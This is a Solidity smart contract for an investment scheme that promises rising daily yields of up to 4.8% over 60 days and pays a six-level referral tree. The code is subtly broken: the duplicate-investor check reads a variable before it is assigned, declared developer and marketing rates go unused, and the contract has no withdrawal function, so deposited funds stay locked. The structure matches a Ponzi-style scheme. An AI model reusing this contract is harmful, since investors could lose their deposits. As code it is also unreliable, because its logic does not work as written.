pragma solidity ^0.4.23;

library SafeMath {
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        assert(c / a == b);
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        // assert(b > 0); // Solidity automatically throws when dividing by 0
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        assert(b <= a);
        return a - b;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        assert(c >= a);
        return c;
    }
}

library Objects {
    struct Investment {
        uint256 planId;
        uint256 investmentDate;
        uint256 investment;
        uint256 lastWithdrawalDate;
        uint256 currentDividends;
        uint256 reinvestAmount;
        bool isExpired;
    }

    struct Plan {
        uint256 id;
        uint256 dailyInterest;
        uint256 term; //0 means unlimited
        bool isActive;
    }

    struct Investor {
        address addr;
        uint256 referrerEarnings;
        uint256 availableReferrerEarnings;
        uint256 referrer;
        uint256 planCount;
        mapping(uint256 => Investment) plans;
        uint256[] levelRefCounts;
        uint256[] levelRefInvestments;
    }
}

contract Demo {
    using SafeMath for uint256;
    uint256 public constant DEVELOPER_RATE = 40; //per thousand
    uint256 public constant MARKETING_RATE = 20;
    uint256 public constant DIVIDENDSPOOL_RATE = 20;
    uint256 public constant REFERENCE_RATE = 70;
    uint256 public constant REFERENCE_LEVEL1_RATE = 40;
    uint256 public constant REFERENCE_LEVEL2_RATE = 20;
    uint256 public constant REFERENCE_LEVEL3_RATE = 5;
    uint256 public constant REFERENCE_SELF_RATE = 5;
    uint256 public constant INVEST_DAILY_BASE_RATE = 18;
    uint256 public constant REINVEST_DAILY_BASE_RATE = 30;
    uint256 public constant MAX_DAILY_RATE = 48;
    uint256 public constant CHANGE_INTERVAL = 6;
    uint256 public constant MINIMUM = 10000000; //minimum investment needed
    uint256 public constant REFERRER_CODE = 6666; //default

    uint256 private constant DAY = 24 * 60 * 60; //seconds

    uint256 public startDate;
    uint256 public latestReferrerCode;
    uint256 private totalInvestments_;

    mapping(address => uint256) public address2UID;
    mapping(uint256 => Objects.Investor) public uid2Investor;
    Objects.Plan[] private investmentPlans_;

    constructor() public {
        startDate = block.timestamp;
        _init();
    }

    function() external payable {
        //do nothing;
    }

    function _init() private {
        latestReferrerCode = REFERRER_CODE;
        address2UID[msg.sender] = latestReferrerCode;
        uid2Investor[latestReferrerCode].addr = msg.sender;
        uid2Investor[latestReferrerCode].referrer = 0;
        uid2Investor[latestReferrerCode].planCount = 0;
        uid2Investor[latestReferrerCode].levelRefCounts = new uint256[](6);
        uid2Investor[latestReferrerCode].levelRefInvestments = new uint256[](6);
        investmentPlans_.push(Objects.Plan(0, 22, 60 * DAY, true));
    }


    function getUIDByAddress(address _addr) public view returns (uint256) {
        return address2UID[_addr];
    }


    function getInvestorInfoByUID(uint256 _uid) public view returns (uint256, uint256, uint256, uint256, uint256, uint256, uint256, uint256[] memory, uint256[] memory) {
        Objects.Investor storage investor = uid2Investor[_uid];
        uint256[] memory newDividends = new uint256[](investor.planCount);
        uint256[] memory currentDividends = new  uint256[](investor.planCount);
        for (uint256 i = 0; i < investor.planCount; i++) {
            require(investor.plans[i].investmentDate != 0, "wrong investment date");
            currentDividends[i] = investor.plans[i].currentDividends;
            if (investor.plans[i].isExpired) {
                newDividends[i] = 0;
            } else {
                if (investmentPlans_[investor.plans[i].planId].term > 0) {
                    if (block.timestamp >= investor.plans[i].investmentDate.add(investmentPlans_[investor.plans[i].planId].term)) {
                        newDividends[i] = _calculateDividends(investor.plans[i].investment, investor.plans[i].reinvestAmount, investor.plans[i].planId, investor.plans[i].investmentDate.add(investmentPlans_[investor.plans[i].planId].term), investor.plans[i].lastWithdrawalDate);
                    } else {
                        newDividends[i] = _calculateDividends(investor.plans[i].investment, investor.plans[i].reinvestAmount, investor.plans[i].planId, block.timestamp, investor.plans[i].lastWithdrawalDate);
                    }
                } else {
                    newDividends[i] = _calculateDividends(investor.plans[i].investment, investor.plans[i].reinvestAmount, investor.plans[i].planId, block.timestamp, investor.plans[i].lastWithdrawalDate);
                }
            }
        }
        return
        (
        investor.referrerEarnings,
        investor.availableReferrerEarnings,
        investor.referrer,
        investor.planCount,
        investor.levelRefCounts[0],
        investor.levelRefCounts[1],
        investor.levelRefCounts[2],
        currentDividends,
        newDividends
        );
    }

    function getInvestmentPlanByUID(uint256 _uid) public view returns (uint256[] memory, uint256[] memory, uint256[] memory, uint256[] memory, bool[] memory) {
        Objects.Investor storage investor = uid2Investor[_uid];
        uint256[] memory planIds = new  uint256[](investor.planCount);
        uint256[] memory investmentDates = new  uint256[](investor.planCount);
        uint256[] memory investments = new  uint256[](investor.planCount);
        uint256[] memory lastWithdrawalDates = new  uint256[](investor.planCount);
        bool[] memory isExpireds = new  bool[](investor.planCount);

        for (uint256 i = 0; i < investor.planCount; i++) {
            require(investor.plans[i].investmentDate != 0, "wrong investment date");
            planIds[i] = investor.plans[i].planId;
            lastWithdrawalDates[i] = investor.plans[i].lastWithdrawalDate;
            investmentDates[i] = investor.plans[i].investmentDate;
            investments[i] = investor.plans[i].investment;
            if (investor.plans[i].isExpired) {
                isExpireds[i] = true;
            } else {
                isExpireds[i] = false;
                if (investmentPlans_[investor.plans[i].planId].term > 0) {
                    if (block.timestamp >= investor.plans[i].investmentDate.add(investmentPlans_[investor.plans[i].planId].term)) {
                        isExpireds[i] = true;
                    }
                }
            }
        }

        return
        (
        planIds,
        investmentDates,
        investments,
        lastWithdrawalDates,
        isExpireds
        );
    }

    function _addInvestor(address _addr, uint256 _referrerCode) private returns (uint256) {
        require(address2UID[addr] == 0, "address is existing");
        if (_referrerCode >= REFERRER_CODE) {
            //require(uid2Investor[_referrerCode].addr != address(0), "Wrong referrer code");
            if (uid2Investor[_referrerCode].addr == address(0)) {
                _referrerCode = 0;
            }
        } else {
            _referrerCode = 0;
        }
        address addr = _addr;
        latestReferrerCode = latestReferrerCode.add(1);
        address2UID[addr] = latestReferrerCode;
        uid2Investor[latestReferrerCode].addr = addr;
        uid2Investor[latestReferrerCode].referrer = _referrerCode;
        uid2Investor[latestReferrerCode].planCount = 0;
        uid2Investor[latestReferrerCode].levelRefCounts = new uint256[](6);
        uid2Investor[latestReferrerCode].levelRefInvestments = new uint256[](6);
        if (_referrerCode >= REFERRER_CODE) {
            uint256 _ref1 = _referrerCode;
            uint256 _ref2 = uid2Investor[_ref1].referrer;
            uint256 _ref3 = uid2Investor[_ref2].referrer;
            uint256 _ref4 = uid2Investor[_ref3].referrer;
            uint256 _ref5 = uid2Investor[_ref4].referrer;
            uint256 _ref6 = uid2Investor[_ref5].referrer;

            uid2Investor[_ref1].levelRefCounts[0] = uid2Investor[_ref1].levelRefCounts[0].add(1);
            if (_ref2 >= REFERRER_CODE) {
                uid2Investor[_ref2].levelRefCounts[1] = uid2Investor[_ref2].levelRefCounts[1].add(1);
            }
            if (_ref3 >= REFERRER_CODE) {
                uid2Investor[_ref3].levelRefCounts[2] = uid2Investor[_ref3].levelRefCounts[2].add(1);
            }
            if (_ref4 >= REFERRER_CODE) {
                uid2Investor[_ref4].levelRefCounts[3] = uid2Investor[_ref4].levelRefCounts[3].add(1);
            }
            if (_ref5 >= REFERRER_CODE) {
                uid2Investor[_ref5].levelRefCounts[4] = uid2Investor[_ref5].levelRefCounts[4].add(1);
            }
            if (_ref6 >= REFERRER_CODE) {
                uid2Investor[_ref6].levelRefCounts[5] = uid2Investor[_ref6].levelRefCounts[5].add(1);
            }
        }
        return (latestReferrerCode);
    }

    function _invest(address _addr, uint256 _planId, uint256 _referrerCode, uint256 _amount) private returns (bool) {
        require(_planId >= 0 && _planId < investmentPlans_.length, "Wrong investment plan id");
        require(_amount >= MINIMUM, "Less than the minimum amount of deposit requirement");
        uint256 uid = address2UID[_addr];
        if (uid == 0) {
            uid = _addInvestor(_addr, _referrerCode);
            //new user
        }
        uint256 planCount = uid2Investor[uid].planCount;
        require(planCount < 200,"planCount is too bigger");
        Objects.Investor storage investor = uid2Investor[uid];
        investor.plans[planCount].planId = _planId;
        investor.plans[planCount].investmentDate = block.timestamp;
        investor.plans[planCount].lastWithdrawalDate = block.timestamp;
        investor.plans[planCount].investment = _amount;
        investor.plans[planCount].currentDividends = 0;
        investor.plans[planCount].isExpired = false;

        investor.planCount = investor.planCount.add(1);

        _calculateReferrerReward(uid, _amount, investor.referrer);

        totalInvestments_ = totalInvestments_.add(_amount);

        return true;
    }


    function invest(uint256 _referrerCode) public payable {
        if (_invest(msg.sender, 0, _referrerCode, msg.value)) {
        }
    }

    function _calculateDividends(uint256 _amount, uint256 _reinvestAmount, uint256 _planId, uint256 _now, uint256 _start) private view returns (uint256) {
        require(_start > startDate);

        uint256 dif = _now.sub(_start);
        uint256 div = 0;
        if (_planId == 0) {
            if (dif > 60 * DAY) {
                dif = 60 * DAY;
            }
            if (dif >= 45 * DAY) {
                div = _amount *
                (5 * INVEST_DAILY_BASE_RATE +
                5 * (INVEST_DAILY_BASE_RATE + CHANGE_INTERVAL) +
                10 * (INVEST_DAILY_BASE_RATE + 2 * CHANGE_INTERVAL) +
                10 * (INVEST_DAILY_BASE_RATE + 3 * CHANGE_INTERVAL) +
                15 * (INVEST_DAILY_BASE_RATE + 4 * CHANGE_INTERVAL)) / 1000 +
                _amount * (dif - 45 * DAY) * (INVEST_DAILY_BASE_RATE + 5 * CHANGE_INTERVAL) / DAY
                / 1000;
            } else if (dif >= 30 * DAY) {
                div = _amount *
                (5 * INVEST_DAILY_BASE_RATE +
                5 * (INVEST_DAILY_BASE_RATE + CHANGE_INTERVAL) +
                10 * (INVEST_DAILY_BASE_RATE + 2 * CHANGE_INTERVAL) +
                10 * (INVEST_DAILY_BASE_RATE + 3 * CHANGE_INTERVAL)) / 1000 +
                _amount * (dif - 30 * DAY) * (INVEST_DAILY_BASE_RATE + 4 * CHANGE_INTERVAL) / DAY
                / 1000;
            } else if (dif >= 20 * DAY) {
                div = _amount *
                (5 * INVEST_DAILY_BASE_RATE +
                5 * (INVEST_DAILY_BASE_RATE + CHANGE_INTERVAL) +
                10 * (INVEST_DAILY_BASE_RATE + 2 * CHANGE_INTERVAL)) / 1000 +
                _amount * (dif - 20 * DAY) * (INVEST_DAILY_BASE_RATE + 3 * CHANGE_INTERVAL) / DAY
                / 1000;
            } else if (dif >= 10 * DAY) {
                div = _amount *
                (5 * INVEST_DAILY_BASE_RATE +
                5 * (INVEST_DAILY_BASE_RATE + CHANGE_INTERVAL)) / 1000 +
                _amount * (dif - 10 * DAY) * (INVEST_DAILY_BASE_RATE + 2 * CHANGE_INTERVAL) / DAY
                / 1000;
            } else if (dif >= 5 * DAY) {
                div = _amount *
                (5 * INVEST_DAILY_BASE_RATE) / 1000 +
                _amount * (dif - 5 * DAY) * (INVEST_DAILY_BASE_RATE + CHANGE_INTERVAL) / DAY
                / 1000;
            } else if (dif < 5 * DAY) {
                div = _amount *
                (dif * INVEST_DAILY_BASE_RATE) / DAY
                / 1000;
            }
        } else if (_planId == 1) {
            if (dif > 60 * DAY) {
                dif = 60 * DAY;
            }
            if (dif >= 30 * DAY) {
                div = _amount *
                (10 * REINVEST_DAILY_BASE_RATE +
                10 * (REINVEST_DAILY_BASE_RATE + CHANGE_INTERVAL) +
                10 * (REINVEST_DAILY_BASE_RATE + 2 * CHANGE_INTERVAL) +
                (dif - 30 * DAY) * (REINVEST_DAILY_BASE_RATE + 3 * CHANGE_INTERVAL) / DAY)
                / 1000;
            } else if (dif >= 20 * DAY) {
                div = _amount *
                (10 * REINVEST_DAILY_BASE_RATE +
                10 * (REINVEST_DAILY_BASE_RATE + CHANGE_INTERVAL)) / 1000 +
                _amount * (dif - 20 * DAY) * (REINVEST_DAILY_BASE_RATE + 2 * CHANGE_INTERVAL) / DAY
                / 1000;
            } else if (dif >= 10 * DAY) {
                div = _amount *
                (10 * REINVEST_DAILY_BASE_RATE) / 1000 +
                _amount * (dif - 10 * DAY) * (REINVEST_DAILY_BASE_RATE + CHANGE_INTERVAL) / DAY
                / 1000;
            } else if (dif < 10 * DAY) {
                div = _amount *
                (dif * REINVEST_DAILY_BASE_RATE) / DAY
                / 1000;
            }
        }
        return div.sub(_reinvestAmount);
    }

    function _calculateReferrerReward(uint256 _uid, uint256 _investment, uint256 _referrerCode) private {

        uint256 _allReferrerAmount = (_investment.mul(REFERENCE_RATE)).div(1000);
        if (_referrerCode != 0) {
            uint256 _ref1 = _referrerCode;
            uint256 _ref2 = uid2Investor[_ref1].referrer;
            uint256 _ref3 = uid2Investor[_ref2].referrer;
            uint256 _ref4 = uid2Investor[_ref3].referrer;
            uint256 _ref5 = uid2Investor[_ref4].referrer;
            uint256 _ref6 = uid2Investor[_ref5].referrer;

            uint256 _refAmount = 0;

            if (_ref1 != 0) {
                _refAmount = (_investment.mul(REFERENCE_LEVEL1_RATE)).div(1000);
                _allReferrerAmount = _allReferrerAmount.sub(_refAmount);
                uid2Investor[_ref1].availableReferrerEarnings = _refAmount.add(uid2Investor[_ref1].availableReferrerEarnings);

                _refAmount = (_investment.mul(REFERENCE_SELF_RATE)).div(1000);
                _allReferrerAmount = _allReferrerAmount.sub(_refAmount);
                uid2Investor[_uid].availableReferrerEarnings = _refAmount.add(uid2Investor[_uid].availableReferrerEarnings);
            }

            if (_ref2 != 0) {
                _refAmount = (_investment.mul(REFERENCE_LEVEL2_RATE)).div(1000);
                _allReferrerAmount = _allReferrerAmount.sub(_refAmount);
                uid2Investor[_ref2].availableReferrerEarnings = _refAmount.add(uid2Investor[_ref2].availableReferrerEarnings);
            }

            if (_ref3 != 0) {
                _refAmount = (_investment.mul(REFERENCE_LEVEL3_RATE)).div(1000);
                _allReferrerAmount = _allReferrerAmount.sub(_refAmount);
                uid2Investor[_ref3].availableReferrerEarnings = _refAmount.add(uid2Investor[_ref3].availableReferrerEarnings);
            }

            if (_ref1 != 0) {
                uid2Investor[_ref1].levelRefInvestments[0] = _investment.add(uid2Investor[_ref1].levelRefInvestments[0]);
            }
            if (_ref2 != 0) {
                uid2Investor[_ref2].levelRefInvestments[1] = _investment.add(uid2Investor[_ref2].levelRefInvestments[1]);
            }
            if (_ref3 != 0) {
                uid2Investor[_ref3].levelRefInvestments[2] = _investment.add(uid2Investor[_ref3].levelRefInvestments[2]);
            }
            if (_ref4 != 0) {
                uid2Investor[_ref4].levelRefInvestments[3] = _investment.add(uid2Investor[_ref4].levelRefInvestments[3]);
            }
            if (_ref5 != 0) {
                uid2Investor[_ref5].levelRefInvestments[4] = _investment.add(uid2Investor[_ref5].levelRefInvestments[4]);
            }
            if (_ref6 != 0) {
                uid2Investor[_ref6].levelRefInvestments[5] = _investment.add(uid2Investor[_ref6].levelRefInvestments[5]);
            }

        }
    }

}
